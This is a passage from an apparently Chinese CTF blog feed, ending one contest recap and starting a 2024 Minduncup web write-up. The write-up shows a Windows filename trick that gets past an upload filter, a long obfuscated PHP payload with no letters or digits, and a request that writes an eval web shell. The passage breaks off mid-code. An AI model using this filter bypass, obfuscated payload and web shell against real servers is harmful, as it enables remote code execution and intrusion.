class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>环境变量没删，flag就在phpinfo里</p><hr><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>整个比赛过程都挺抽象的</p><p>在35度的篮球场里打8小时，人和电脑都得红温。好热…热得我要被晒干（？）了…就算没动也好热啊~</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/20240624205821.jpg" alt="20240624205821"></p><p>你在办一种很新的awdp，早上打四小时的break，下午再打四小时的fix，那早上不就等同于在打ctf？</p><p>开场的第一首歌：正在播放——春日影.mp3</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240626171208678.png" alt="image-20240626171208678"></p><p>开局pwn和web的题目上反了一道，还以为web什么时候也用二进制文件跑了</p><p>不过居然真的有webpwn，当然fix不能用web的方法fix，虽然我也不明白为什么要对一个ctf题搞fix。。。</p><p>华东南web的题目难度跟初赛比真的低太多了，还好没java，不然真得寄</p><p>然后是一些需要注意的事：</p><ul><li>本地 vscode 的commit ID会经常改变，于是建议在开赛当天还能联网的时候先下载好对应的ssh连接包</li><li>开发和安全缺一不可，别attack嘎嘎做然后waf写不动（</li></ul><p>接下来就是思考怎么准备决赛了，先立几个要完成的目标：</p><ul><li>CTF部分：因为到现在hw面试连个着落都没有，所以试图一个月内跟着<a href="https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file">Drun1baby师傅的java学习路线</a>搞定java（x；然后是复现之前比赛屯下的题目，那些比赛的题，很难，但得会；还有少刷点视频，多看看知识星球</li><li>渗透：有巨魔在，渗透压力会小一点，但是我自己也得去学一下内网代理，打打春秋云境和vulhub，然后准备自己的漏洞库，这个估计得多看看狗佬的博客了</li><li>AWD：吸取大b哥的经验，提前造轮子打批量，不然到时候有咱急的；然后就是记得把jar和war包打包明白（</li><li>Build：？</li><li>期末考：别挂，别挂，别挂，再挂下去会似</li><li>整点阳间的作息吧哥，放假了就别熬夜了，还是享受当下重要！</li><li>别成天惦记凹你那总力战&#x2F;深渊&#x2F;肉鸽了，还有很多事没做，有这时间都能推几个ap了，steam上还有一堆galgame没推呢（（</li></ul><p><del>什么，我一个月搞定这些，真的假的？</del></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;⚠热异常⚠&lt;/p&gt;
&lt;p&gt;办的很好，下次别在fjnu办了，切割了（（&lt;/p&gt;
&lt;p&gt;&lt;del&gt;现在是6月23号早上的8点36，星期天；24号，高等数学，（差）一章没看，27号，概率论，还行，还剩题没做…欸这茶歇东西还挺多ww&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;是web的wp&lt;/p&gt;
&lt;p&gt;由我和@Laffey共同完成，个人对web的评价是纯拼积累，线下断网情况下有一个自己的本地博客太重要了，然后就是老赛棍魅力时刻（&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165857174.png&quot; alt=&quot;image-20240623165857174&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWDP" scheme="http://c1oudfl0w0.github.io/blog/categories/AWDP/"/>
    
    
  </entry>
  
  <entry>
    <title>2024闽盾杯-黑盾赛道CTF初赛-本科组</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/</id>
    <published>2024-06-22T01:33:04.000Z</published>
    <updated>2024-06-27T10:27:43.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>鉴定为找flag大赛</p><p>第二年了还是进不去线下，只靠自己真是一点也打不穿啊。。</p><p>官方wp：<a href="https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf">https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf</a></p><p>合着全是543出的是吧</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="No-characters"><a href="#No-characters" class="headerlink" title="No characters"></a>No characters</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">告诉你我是windows又怎么样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是一个文件上传的功能</p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622102314801.png" alt="image-20240622102314801"></p><p>测试发现过滤了一些后缀名，包括php</p><p>因为是windows环境，所以这里需要利用windows的特性来上传文件</p><p>参考：<a href="https://blog.csdn.net/m0_68976043/article/details/136695554">https://blog.csdn.net/m0_68976043/article/details/136695554</a></p><p>这样传php的问题就解决了</p><p>先传入一个文件名为<code>1.php:jpg</code></p><p>然后再传入第二个文件名为<code>1.&lt;&lt;&lt;</code>，此时就相当于写入了php文件</p><p>然后测试发现文件内容不能有字母和数字，即无字母数字rce</p><p>参考：<a href="https://www.cnblogs.com/poing/p/12831304.html">https://www.cnblogs.com/poing/p/12831304.html</a></p><p>写入自增构造的payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后写马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">__=file_put_contents&amp;_=3.php&amp;___=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622122456075.png" alt="image-20240622122456075"></p><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code 